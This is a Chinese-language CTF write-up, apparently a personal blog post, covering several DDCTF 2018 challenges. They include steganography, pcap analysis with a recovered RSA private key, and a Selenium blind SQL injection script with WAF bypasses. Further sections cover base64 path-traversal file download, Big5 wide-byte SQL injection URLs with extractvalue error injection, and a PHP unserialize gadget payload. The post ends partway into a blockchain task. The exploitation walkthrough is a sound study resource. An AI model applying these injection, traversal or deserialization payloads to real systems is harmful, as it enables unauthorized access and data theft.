---
title: ddctf
date: 2018-04-20 14:45:40
tags:
---
# 签到题目:
复制，粘贴

# (╯°□°）╯︵ ┻━┻
题目给了一个字符串
```
d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1b2e2e5e2b5b4e4b8b7e6e1e1b6b9e4b5e3b8b1b1e3e5b5b6b4b1b0e4e6b2fd
```

首先，应该想到两两一组，一组代表一个字符，考虑到DDCTF，"DD"两个字符，在字符串中找到两组相邻的字符串，找到了"c4c4"和"e1e1"：

d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0<b>c4c4</b>c3d4c6fbb9e1b2e2e5e2b5b4e4b8b  7e6<b>e1e1</b>b6b9e4b5e3b8b1b1e3e5b5b6b4b1b0e4e6b2fd

进一步分析可知，<b>c4</b>和<b>c3</b>刚好相差1，而<b>D</b>和<b>C</b>的ascii值也相差1，<b>c4c4</b>应该就表示"DD", 然后以此类推：

![avatar](/images/ddctf/20180420150038.png)

# 第四扩展FS
1. 下载下来是一张图片

首先:``` binwalk windows.jpg```

```
security:/mnt/c/Users/HT/Desktop/ddctf$ binwalk windows.jpg

DECIMAL         HEX             DESCRIPTION
-------------------------------------------------------------------------------------------------------
30              0x1E            TIFF image data, big-endian
2871992         0x2BD2B8        LZMA compressed data, properties: 0x01, dictionary size: 2097152 bytes, uncompressed size: 134217728 bytes
7236510         0x6E6B9E        Zip archive data, at least v2.0 to extract, compressed size: 20430, uncompressed size: 33350, name: "file.txt"
7257054         0x6EBBDE        End of Zip archive

Progress: 81.81% (10890274 / 13310878)
```
可以看到图片里边有个压缩包。
这时候，可以使用`dd`或者`foremost`命令，来分离压缩包。

> dd if=windows.jpg of=temp.zip skip=7236510 count=20544 bs=1  
> foremost windows.jpg

得到一个压缩包，然后，查看图片属性，会在详细信息->备注里看到一个字符串"Pactera"，估计就是密码。

2. 然后打开file.txt

![avatar](/images/ddctf/20180420151247.png)  
可以看到有很多乱序字符，结合题目的提示，<b>日常违规审计中频次有时候非常重要</b>,可以统计一下每个字符串的个数，并排序。

```
grep -o . file.txt | sort |uniq -c | sort -rn
```

![avatar](/images/ddctf/20180420151941.png)

然后从新组合一下，就得到flag了。

```
DDCTF{ZuozHengqU3dEshi}
```
<!--more-->

# 流量分析
这道题，花了我很长时间，直到ddctf快结束，才做出来，可以说完全被Fl-g.zip和sqlmap.zip绕进去了，气的我都想打我自己。  
过程如下:
首先大体上浏览整个数据包，会发现，大体上就是3个部分:  

+  ftp 发送了两个zip,Fl-g.zip和sqlmap.zip,传了一大堆数据  
+  邮件相关的数据包
+  https相关的包，由于只有几个，竟然被我选择性忽略了。

## ftp之Fl-g.zxip
> tcp.stream eq 2004   

右键follow tcp流，保存数据，发现只有119kb，解压也提示包损坏，要密码，最终也没啥结果。

然后，感觉应该是follow tcp流，没有得到所有的数据，于是，使用:
> tcp.stream eq 2004 && ftp-data

得到Fl-g.zip相关的数据包,另存为flag.pcap，然后编写代码，一个一个的拼接数据。

```
from scapy.all import * 
pcaps = rdpcap("flag.pcap")

fp = open("flag.zip", "wb")
length = 0
for pcap in pcaps:
    value = pcap['Raw'].original
    length += len(value)
    fp.write(value)
print(length)
fp.close()
```
得到13M大小的flag.zip,通过一番操作，尝试了密码爆破，伪加密，压缩包修复，来来回回折腾了几遍，最终，使用7-zip，密码:zhangsan，竟然解压得到了一个类似于mp4格式的文件，不知道这玩意和qr-code.jpg有什么关系，还没办法播放。主要原因，还是Fl-g.zip缺失了大量的数据，在明知缺失大量数据的情况下，感觉应该立即放弃，不过这压缩包名字实在太忽悠，折腾了3,4天我才放弃，浪费我大量时间。

## ftp之sqlmap.zip
> tcp.stream eq 2005

既然给了这个压缩包，感觉应该会有点用（实际上:一点用没有）,首先，follow tcp流，只有163kb，于是和Fl-g.zip一样,过滤:
> tcp.stream eq 2004 && ftp-data

得到sqlmap.zip相关的数据包,另存为sqlmap.pcap，然后编写代码，一个一个的拼接数据。


```
from scapy.all import * 
pcaps = rdpcap("sqlmap.pcap")

fp = open("sqlmap.zip", "wb")
length = 0
for pcap in pcaps:
    value = pcap['Raw'].original
    length += len(value)
    fp.write(value)
print(length)
fp.close()
```

得到了一个sqlmap.zip，第一次打开，用winrar，点击工具->修复压缩文件，修复一下。然后，爆破，伪加密，又搞了一遍，我都不知道我哪来的耐心。最后，想到已知明文攻击。

已知明文攻击: 已知明文攻击要求加密的压缩包和非加密的压缩包里有相同的文件，并且文件的crc32值要相同，然后就可以使用archpr这个软件进行已知明文攻击。

然后，去github.com下载最新版本的sqlmap,发现文件的crc32值并不相同，需要下载sqlmap1.1.10.zip才行。最后，解压sqlmap.zip得到的文件和sql1.1.10.zip里的文件一模一样，没有一点有用的东西。

## 邮件部分
通过follow tcp流，当tcp.stream eq 2016的时候，会看到有一个image001图片:

```
Content-type: image/png; name="image001.png";
 x-mac-creator="4F50494D";
 x-mac-type="504E4766"
Content-ID: <image001.png@01D38B05.8079CE40>
Content-disposition: inline;
	filename="image001.png"
Content-transfer-encoding: base64
```

下边跟着一大堆base64字符串，直接复制保存到一个文件1.txt里边。

```
import base64

fp = open("1.txt", "r")
fp1 = open("file.png", "wb")

fp1.write(base64.b64decode(fp.read()))
```

然后，就可以得到一个file.png。

![avatar](/images/ddctf/20180425151942.png)

然后，就是将图片中的字符串提取出来。

```
MIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ
LsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO
vMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB
AoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4
QGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/
QbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN
czILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ
ZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9
kzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN
+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1
AnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH
/5pfc3AmEyRdfyx6zWUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH
2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=
```

再结合题目的提示，应该就是RSA私钥。我找到的东西大概就这么多。

一开始的思路，就是解压Fl-g.zip，得到qr-code.jpg,最后，估计用这个私钥去解密什么东西得到flag。由于这错误的思路，所以做了3,4天没做出来。

## 得到flag
今天是ddctf最后一天，"喝杯java"，感觉来不及做了，就又开始看这道题，百度了一下，wireshark如何使用rsa私钥解密https流量。

rsa密钥也就是，保存一下就行了:

```
-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ
LsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO
vMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB
AoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4
QGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/
QbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN
czILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ
ZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9
kzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN
+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1
AnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH
/5pfc3AmEyRdfyx6zWUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH
2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=
-----END RSA PRIVATE KEY-----
```


![avatar](/images/ddctf/20180420184445.png)

然后，查看http包，flag就出来了。

![avatar](/images/ddctf/20180420183706.png)

# 数据库的秘密
## X-forwarded-for
首先打开网页，可以看到"非法链接，只允许来自 123.232.23.245 的访问",很容易就想到修改X-forwarded-for, Chrome下我使用[Modheader](https://chrome.google.com/webstore/search/modheader?hl=zh-CN)插件,然后修改一下X-forwarded-for就行了
## 寻找注入点
既然是数据库的秘密，加上又有查询功能，应该就是sql注入了。在查看源码之后，会发现除了id,title,date三个字段之外还有一个隐藏字段author，然后就是一个一个的测试，不出意外应该是author可以注入，为了保险还是一个一个的测试一下。

* id 无论输入什么，都会被转化为数字或者为空，应该是用了intval()，不存在注入点。
* title和date均过滤了单引号，双引号，右斜杠，宽字节也不好使，估计也不好注入。
* author
  * "admin", 会得到author 为 "admin" 的两条记录
  * "admin'", 一条记录都没有
  * "admin'#", 同样会得到author 为 "admin" 的两条记录，那注入点应该就是这里了。
  * "admin' and 1=1#", 发现会有网站防火墙拦截，应该是"and"被拦截，可以使用"&&"来替换"and",然后，同样会查询出两条记录。

## 注入 
找到注入点之后，就好办了。

* "admin' order by 6#", 失败，"admin' order by 5#"，成功查询，那就是5列了。 
* "admin' union select 1,2,3,4,5#", 被防火墙拦截，然后就是各种测试"union select",没能成功绕过(比赛结束之后，有师傅说可以绕过，[链接](https://github.com/Bypass007/vuln/blob/master/OpenResty/OpenResty%20uri%E5%8F%82%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.md)，由兴趣的小伙伴可以尝试一下)。那就尝试bool注入了。
* "admin' && 1=(substr((select group_concat(schema_name) from information_schema.schemata),1,1)<'z')#",成功拿到数据，接下来就是写脚本拿flag了。
  脚本如下:

```
import time
from selenium import webdriver
import string

strings = string.ascii_letters + string.punctuation + string.digits
string_value = ",0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz{}"
url="http://116.85.43.88:8080/EHZTYREPPGMCQLNB/dfe3ia/index.php"
path="D:\\python\\chromedriver.exe"
driver = webdriver.Chrome(executable_path=path)
payload = "admin' && 1=(substr((select group_concat(schema_name) from information_schema.schemata),%d,1)='%s')#"
payload_table = "admin' && 1=(substr((select group_concat(table_name) from information_schema.tables where table_schema='ddctf'),%d,1)='%s')#"
payload_column = "admin' && 1=(substr((select group_concat(column_name) from information_schema.columns where table_name='ctf_key7'),%d,1)='%s')#"
payload_value = "admin' && 1=(ord(substr((select group_concat(secvalue) from ddctf.ctf_key7),%d,1))=ord('%s'))#"

def inject():
    data = ""

    driver.get(url)
    input("jixu:")
    judge = True
    index = 1
    while judge:
        judge_temp = False
        for i in string_value:
            payload_temp = payload_value % (index, i)
            print(payload_temp)
            driver.get(url)
            driver.execute_script('document.getElementById("author").type="text"')
            driver.find_element_by_id("author").send_keys(payload_temp)
            driver.find_element_by_id("button").click()
            if "admin" in driver.page_source:
                data += i
                index += 1
                judge_temp = True
                print(data)
                break
            time.sleep(1)
        if judge_temp is not True:
            driver.close()
			judge = False

inject(payload_value)
# table_schema:  ddctf
# tables: ctf_key7, message
# columns: ctf_key7下: secvalue，flag就保存在sevalue里边
```

## 注意点
*  每次请求时，js都会计算一个sig值和time值，计算方法在main.js中
   <code>
   eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('e f(0,4){5 7=\'\';l(i m 0){n(i!=\'c\'){a=\'\';a=i+\'=\'+0[i];7+=a}}o k(7+4)};5 0={8:\'\',9:\'\',b:\'\',6:\'\',d:h(j v().u()/w)};e x(){0[\'8\']=1.2(\'8\').3;0[\'9\']=1.2(\'9\').3;0[\'b\']=1.2(\'b\').3;0[\'6\']=1.2(\'6\').3;5 c=f(0,4);1.2(\'g\').q="p.s?r="+c+"&d="+0.d;1.2(\'g\').t()}',34,34,'obj|document|getElementById|value|key|var|date|str0|id|title|str1|author|sign|time|function|signGenerate|queryForm|parseInt||new|hex_math_enc|for|in|if|return|index|action|sig|php|submit|getTime|Date|1000|submitt'.split('|'),0,{}))  
   </code>
   看上去挺复杂，所以我就用selenium，这样就不用操心sig和time值了。

*  由于需要修改X-forwarded-for值，可以使用代理，我这里采用了更笨的方法，在代码里可以看到:

```
driver.get(url)
input("jixu:")
```
首先先发起一次请求，启动webdriver，然后用input()阻塞，这时候，就可以在启动之后的webdriver中安装[Modheader](https://chrome.google.com/webstore/search/modheader?hl=zh-CN)插件，安装完毕，修改好X-forwarded-for之后，就可以在控制台随便输入一个数据，然后，脚本就可以欢快的执行了。

# 专属链接
## 任意文件下载
首先F12抓包，会看到一个有意思的请求，http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28=,"ZmF2aWNvbi5pY28=",base64_encode之后就是"favicon.ico",图片的内容如下:"you can only download .class .xml .ico .ks files",表明应该是一个下载链接，然后就可以按照war包的格式，下载指定后缀的任意文件了。

![avatar](/images/ddctf/20180421191033.png)

其中需要注意的有三个文件，

* _.._WEB-INF_classes_com_didichuxing_ctf_controller_user_FlagController.class,该文件的地址通过构造"116.85.48.102:5050/flag/test/flag/DDCTF{BASD}"或类似的链接使得网站报错即可得到。

 ![avatar](/images/ddctf/201804211191034.png)

* _.._WEB-INF_classes_com_didichuxing_ctf_controller_user_StaticController.class,该文件的地址通过构造"116.85.48.102:5050/image/banner/[随便一个错误的地址]"或类似的链接使得网站报错即可得到。

 ![avatar](/images/ddctf/20180421191037.png)

* _.._WEB-INF_classes_emails.txt_a___,这个文件按理来说是无法下载的，不过我做题的时候，还是可以下载的，可以通过"116.85.48.102:5050/base64_encode('../../WEB-INF/classes/email.txt/a/../')",(注意，base64_encode('../../WEB-INF/classes/email.txt/a/../')是个base64之后的字符串，我这里为了方便大家查看这么写的),就可以绕过了,是个非预期，过了几天，bug修补之后，就没办法下载了，里面的邮箱或者首页的邮箱其实都可以用，所以这个文件下载下不下都无所谓，可惜了，当时应该可以下载数据库的配置文件的，我因为拿到flag就忘记的这一茬，不然，说不定还能改别人的flag，当然我是不可能这么做滴~。

## 审计代码

下载下来的class文件，通过Intellij idea打开，就可以直接得到反编译之后的代码了。
其中最重要的两个文件是FlagController.class和InitListener.class。

* FlagController.class

```
public String getFlag(@PathVariable("email") String email, ModelMap model) {
        Flag flag = this.flagService.getFlagByEmail(email);
        return "Encrypted flag : " + flag.getFlag();
    }
```
在该文件中，可以得到一个获取加密后的flag的路由，需要一个邮箱，当然该邮箱也是加密之后的邮箱，如何加密邮箱，可以在InitListener.class中看到。

* InitListener.class

```
public void onApplicationEvent(ApplicationEvent event) {
        if(event.getSource() instanceof ApplicationContext) {
            WebApplicationContext ctx = (WebApplicationContext)event.getSource();
            if(ctx.getParent() == null) {
                String regenflag = this.properties.getProperty("regenflag");
                if(regenflag != null && "false".equals(regenflag)) {
                    System.out.println("skip gen flag");
                } else {
                    try {
                        this.flagService.deleteAll();
                        int id = 1;
                        String path = ctx.getServletContext().getRealPath("/WEB-INF/classes/emails.txt");
                        String ksPath = ctx.getServletContext().getRealPath("/WEB-INF/classes/sdl.ks");
                        System.out.println(path);
                        String emailsString = FileUtils.readFileToString(new File(path), "utf-8");
                        String[] emails = emailsString.trim().split("\n");
                        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());
                        FileInputStream inputStream = new FileInputStream(ksPath);
                        keyStore.load(inputStream, this.p.toCharArray());
                        Key key = keyStore.getKey("www.didichuxing.com", this.p.toCharArray());
                        Cipher cipher = Cipher.getInstance(key.getAlgorithm());
                        cipher.init(1, key);
                        SecretKeySpec signingKey = new SecretKeySpec("sdl welcome you !".getBytes(), "HmacSHA256");
                        Mac mac = Mac.getInstance("HmacSHA256");
                        mac.init(signingKey);
                        SecureRandom sr = new SecureRandom();
                        String[] var16 = emails;
                        int var17 = emails.length;

                        for(int var18 = 0; var18 < var17; ++var18) {
                            String email = var16[var18];
                            String flag = "DDCTF{" + Math.abs(sr.nextLong()) + "}";
                            String uuid = UUID.randomUUID().toString().replace("-", "s");
                            byte[] data = cipher.doFinal(flag.getBytes());
                            byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());
                            Flag flago = new Flag();
                            flago.setId(Integer.valueOf(id));
                            flago.setFlag(byte2hex(data));
                            flago.setEmail(byte2hex(e));
                            flago.setOriginFlag(flag);
                            flago.setUuid(uuid);
                            flago.setOriginEmail(email);
                            this.flagService.save(flago);
                            System.out.println(email + "同学的入口链接为：http://116.85.48.102:5050/welcom/" + uuid);
                            ++id;
                            System.out.println(flago);
                        }
                    } catch (KeyStoreException var25) {
                        var25.printStackTrace();
                    } catch (IOException var26) {
                        var26.printStackTrace();
                    } catch (NoSuchAlgorithmException var27) {
                        var27.printStackTrace();
                    } catch (CertificateException var28) {
                        var28.printStackTrace();
                    } catch (UnrecoverableKeyException var29) {
                        var29.printStackTrace();
                    } catch (NoSuchPaddingException var30) {
                        var30.printStackTrace();
                    } catch (InvalidKeyException var31) {
                        var31.printStackTrace();
                    } catch (IllegalBlockSizeException var32) {
                        var32.printStackTrace();
                    } catch (BadPaddingException var33) {
                        var33.printStackTrace();
                    }

                }
            }
        }
    }
```
该文件中onApplicationEvent方法意思是，在应用启动之后，首先判断是否需要生成flag，如果需要生成flag，然后读取email.txt里边的邮箱一一加密，同时生成flag，并保存到数据库中。只要可以得到加密后的email.txt就可以获得加密后的flag，并通过相应的sdl.ks获取公钥，最终解密加密后的flag即可得到flag了。

## 获取flag
* 生成加密的email，随便在email.txt中获取一条email，或者首页的邮箱。

```
public class cipher {
    public static  void main(String[] args) throws Exception {
        gencipher();
//        String email = "email";
//        SecretKeySpec signingKey = new SecretKeySpec("sdl welcome you !".getBytes(), "HmacSHA256");
//        Mac mac = Mac.getInstance("HmacSHA256");
//        mac.init(signingKey);
//        byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());
//        System.out.println(byte2hex(e));
    }

    public static void gencipher() throws Exception {
        String p = "sdl welcome you !".substring(0, "sdl welcome you !".length() - 1).trim().replace(" ", "");
        String ksPath = "D:\\java\\ddctf\\src\\main\\java\\sdl.ks";
        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());
        FileInputStream inputStream = new FileInputStream(ksPath);
        keyStore.load(inputStream, p.toCharArray());
//        Key key = keyStore.getKey("www.didichuxing.com", p.toCharArray());
        Key key = keyStore.getCertificate("www.didichuxing.com").getPublicKey();
        Cipher cipher = Cipher.getInstance(key.getAlgorithm());
        cipher.init(2, key);
        String flag = "019312D7231329ADEB986C6F994D7148B74AF9282B515F80F58A88BCE863F8848600CA69C4BE8F0D3BE3486B4FB7445C15169085F1DFE4D4B8439EF3472B50DE22D6E09BCCBC56542541D0C8F148B658005C2DD89202AEBF765998C2FA6AA197E5F6277587E78498F7E0A111429D3E1BEE2F4DD17224C0599FFA2FC1EE69B2521EEB96859EEB3D65DA88FED274739B208A81AF6280CF233B2064C6DB513AB9D53B010A456B8073C8C950E29034628C957108E7173390FBB4665229A6A9949188C8A5D43AE7CDB6244F082EF90EB3D2E126764CF90DE716A2150652AE3C13C0B457BD76E9BF1F9936AD85474CEDB23472039B5EC3387EF4FB5D5E3BD0FA681CDE";
        byte[] data = cipher.doFinal(hexStringToBytes(flag));
        System.out.println(new String(data));
    }

    public static String byte2hex(byte[] b) {
        StringBuilder hs = new StringBuilder();

        for(int n = 0; b != null && n < b.length; ++n) {
            String stmp = Integer.toHexString(b[n] & 255);
            if(stmp.length() == 1) {
                hs.append('0');
            }

            hs.append(stmp);
        }

        return hs.toString().toUpperCase();
    }

    public static byte[] hexStringToBytes(String hexString) {
        if (hexString == null || hexString.equals("")) {
            return null;
        }
        hexString = hexString.toUpperCase();
        int length = hexString.length() / 2;
        char[] hexChars = hexString.toCharArray();
        byte[] d = new byte[length];
        for (int i = 0; i < length; i++) {
            int pos = i * 2;
            d[i] = (byte) (charToByte(hexChars[pos]) << 4 | charToByte(hexChars[pos + 1]));
        }
        return d;
    }

    private static byte charToByte(char c) {
        return (byte) "0123456789ABCDEF".indexOf(c);
    }
}
```
通过这几行代码就可以获得一个加密后的邮箱了,邮箱使用首页展示的邮箱就行。

```
//        String email = "email";
//        SecretKeySpec signingKey = new SecretKeySpec("sdl welcome you !".getBytes(), "HmacSHA256");
//        Mac mac = Mac.getInstance("HmacSHA256");
//        mac.init(signingKey);
//        byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());
//        System.out.println(byte2hex(e));
```
拿到该加密后的邮箱，就可以获得加密后的flag。

 ![avatar](/images/ddctf/20180421191047.png)

拿到加密之后的flag之后，就可以解密了。

```
public static void gencipher() throws Exception {
        String p = "sdl welcome you !".substring(0, "sdl welcome you !".length() - 1).trim().replace(" ", "");
        String ksPath = "D:\\java\\ddctf\\src\\main\\java\\sdl.ks";
        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());
        FileInputStream inputStream = new FileInputStream(ksPath);
        keyStore.load(inputStream, p.toCharArray());
        Key key = keyStore.getCertificate("www.didichuxing.com").getPublicKey();
        Cipher cipher = Cipher.getInstance(key.getAlgorithm());
        cipher.init(2, key);
        String flag = "019312D7231329ADEB986C6F994D7148B74AF9282B515F80F58A88BCE863F8848600CA69C4BE8F0D3BE3486B4FB7445C15169085F1DFE4D4B8439EF3472B50DE22D6E09BCCBC56542541D0C8F148B658005C2DD89202AEBF765998C2FA6AA197E5F6277587E78498F7E0A111429D3E1BEE2F4DD17224C0599FFA2FC1EE69B2521EEB96859EEB3D65DA88FED274739B208A81AF6280CF233B2064C6DB513AB9D53B010A456B8073C8C950E29034628C957108E7173390FBB4665229A6A9949188C8A5D43AE7CDB6244F082EF90EB3D2E126764CF90DE716A2150652AE3C13C0B457BD76E9BF1F9936AD85474CEDB23472039B5EC3387EF4FB5D5E3BD0FA681CDE";
        byte[] data = cipher.doFinal(hexStringToBytes(flag));
        System.out.println(new String(data));
    }
```
该加密是RSA加密，需要拿到公钥才行，公钥的话，只需要通过以下代码就可

```
String ksPath = "D:\\java\\ddctf\\src\\main\\java\\sdl.ks";
KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());
FileInputStream inputStream = new FileInputStream(ksPath);
keyStore.load(inputStream, p.toCharArray());
Key key = keyStore.getCertificate("www.didichuxing.com").getPublicKey();
```
然后就可以解密得到flag.
> DDCTF{5218295657878818503}

# 注入的奥妙
## sql注入
首先，测试单引号，双引号，会发现均会被转义，然后%df，直接就没反应了，过了一会，输了一个中文的单引号"‘"，发现输出竟然乱码。

 ![avatar](/images/ddctf/20180421195946.png)

 然后就输入了几个中文，发现还是乱码，只有输入英文才没有乱码，应该是后台进行了编码转换。

 ![avatar](/images/ddctf/20180421200130.png)

 于是便测试了一下是什么编码，经过测试，发现是Big5编码，后来发现题目在源码里边给出了提示链接（https://wenku.baidu.com/view/bd29b7b3fd0a79563c1e72f7.html)可惜做题时没看到。

 ![avatar](/images/ddctf/20180421200307.png)

 我选择了"么"

 ![avatar](/images/ddctf/20180421200748.png)

 通过测试"http://116.85.48.105:5033/5d71b644-ee63-4b11-9c13-da3c4ac35b8d/well/getmessage/%E4%B9%88'"，可以看到单引号成功逃逸。

```

 最后拼接的参数是 : ?\\'
​~~~如果自己拼接的参数显示有问题了，试试浏览器的页面编码设置~~~
很遗憾没有找到数据 可以试试别的 ！
42000 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''?\\''' at line 1
```
单引号成功逃逸，然后就是简单的sql注入获取数据了，报错注入或者直接获取数据均可，还是手工,这里需要注意，部分字符串被过滤，只要双写绕过就行，同时由于编码的原因，直接获取数据的话，会报错编码有问题，我感觉应该就是这原因，出题人把错误展示出来了，需要编码不同的地方添加"collate utf8_general_cli",强制转换编码即可。

* 获取数据库。http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1%E4%B9%88'%20uniunionon%20select%201,2,extracextractvaluetvalue(1,%20concat(0x3a,%20dadatabasetabase(),%200x3a))%23  
   得到结果"sqli"
* 获取'sqli'下的table。http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1么' uniunionon select 1,2,extracextractvaluetvalue(1, concat(0x3a, (select group_concat(table_name) COLLATE utf8_general_ci from information_schema.tables where table_schema=0x73716c69), 0x3a))%23  
   得到结果"message,route_rules"
* 获取"route_rules"的列名。http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1么' uniunionon select 1,2,extracextractvaluetvalue(1, concat(0x3a, (select group_concat(column_name) COLLATE utf8_general_ci from information_schema.tables where table_schema=0x73716c69), 0x3a))%23  
   得到结果"id,pattern,action,rulepass"
* 然后获取route_rules表中的数据。
   数据如下:  
   1   get*/   u/well/getmessage/   
   12  get*/   u/justtry/self/  
   13  post*/  u/justtry/try  
   15  static/bootstrap/css/backup.css static/bootstrap/css/backup.zip

## 代码审计
通过上边的"116.85.48.105:5033/5d71b644-ee63-4b11-9c13-da3c4ac35b8d/static/bootstrap/css/backup.css"，可以拿到代码。

+ Jusstry.php

```
public function try($serialize)
{
    unserialize(urldecode($serialize), ["allowed_classes" => ["Index\Helper\Flag", "Index\Helper\SQL","Index\Helper\Test"]]);
}
```
通过这段代码，可以看到使用了unserialize()方法，可能存在反序列化漏洞。

+ Flag.php

```
<?php
namespace Index\Helper;

use PDO;
use Index\Helper\SQL;

defined('ACCESS_FILE') or exit('No direct script access allowed');
class Flag
{
    public $sql;

    //
    public function __construct()
    {
        $this->sql=new SQL();
    }

    //
    public function get($user)
    {

        $tmp=$this->sql->FlagGet($user);
        if ($tmp['status']===1) {
            return $this->sql->FlagGet($user)['flag'];
        }
    }
}

```
该类说明只要调用get方法就可以得到指定用户的flag。

+ Test.php

```
class Test
{

    public $user_uuid = "4f5aa917-e388-4aa5-bcdc-125b9b95e12a";
    public $fl;

    public function __construct()
    {
        echo 'hhkjjhkhjkhjkhkjhkhkhk';
        $this->fl = new Flag();
    }

    public function __destruct()
    {
        $this->getflag('ctfuser', $this->user_uuid);
    }

    public function setflag($m = 'ctfuser', $u = 'default', $o = 'default')
    {
        $user=array(
            'name' => $m,
            'oldid' => $o,
            'id' => $u
        );
        // var_dump($user);

        echo $this->fl->set($user, 2);
    }

    public function getflag($m = 'ctfuser', $u = 'default')
    {
        //TODO: check username
        $user=array(
            'name' => $m,
            'id' => $u
        );
        //懒了直接输出给你们了
        echo 'DDCTF{'.$this->fl->get($user).'}';
    }
}
```
在Test类中，可以看到调用了__destruct()方法，并且该方法调用了getflag方法。这样，只需要构造一个Test类，并令$f1=new Flag(),$user_uuid="4f5aa917-e388-4aa5-bcdc-125b9b95e12a"，然后序列化，然后就可以获得flag了，需要注意的是，Flag.php中的$sql也是需要赋值的。

```
<?php
namespace Index\Helper;

use Index\Helper\Flag;
use Index\Helper\UUID;

class SQL
{
    public $dbc;
    public $pdo;

    //
    public function __construct()
    {
    }
}

class Flag
{
    public $sql;

    //
    public function __construct()
    {
        $this->sql=new SQL();
    }
}


// defined('ACCESS_FILE') or exit('No direct script access allowed');
class Test
{

    public $user_uuid = "4f5aa917-e388-4aa5-bcdc-125b9b95e12a";
    public $fl;

    public function __construct()
    {
        echo 'hhkjjhkhjkhjkhkjhkhkhk';
        $this->fl = new Flag();
    }

    public function __destruct()
    {
        // $this->getflag('ctfuser', $this->user_uuid);
    }
}

echo serialize(new Test());
```
即可得到序列化之后的值:"hhkjjhkhjkhjkhkjhkhkhkO:17:"Index\Helper\Test":2:{s:9:"user_uuid";s:36:"4f5aa917-e388-4aa5-bcdc-125b9b95e12a";s:2:"fl";O:17:"Index\Helper\Flag":1:{s:3:"sql";O:16:"Index\Helper\SQL":2:{s:3:"dbc";N;s:3:"pdo";N;}}}",然后就可以得到flag了。

 ![avatar](/images/ddctf/20180421150038.png)

# mini blockchain
## 构造符合条件的区块
```
import json
import hashlib
from itertools import product
import string
from functools import reduce
import rsa

EMPTY_HASH = '0' * 64

def hash(x):
    return hashlib.sha256(hashlib.md5(x.encode()).digest()).hexdigest()


def hash_reducer(x, y):
    return hash(hash(x) + hash(y))


def hash_block(block):
    return reduce(hash_reducer, [block['prev'], block['nonce'],
                                 reduce(hash_reducer, [tx['hash'] for tx in block['transactions']], EMPTY_HASH)])

block = {
    "nonce": "6h0F",
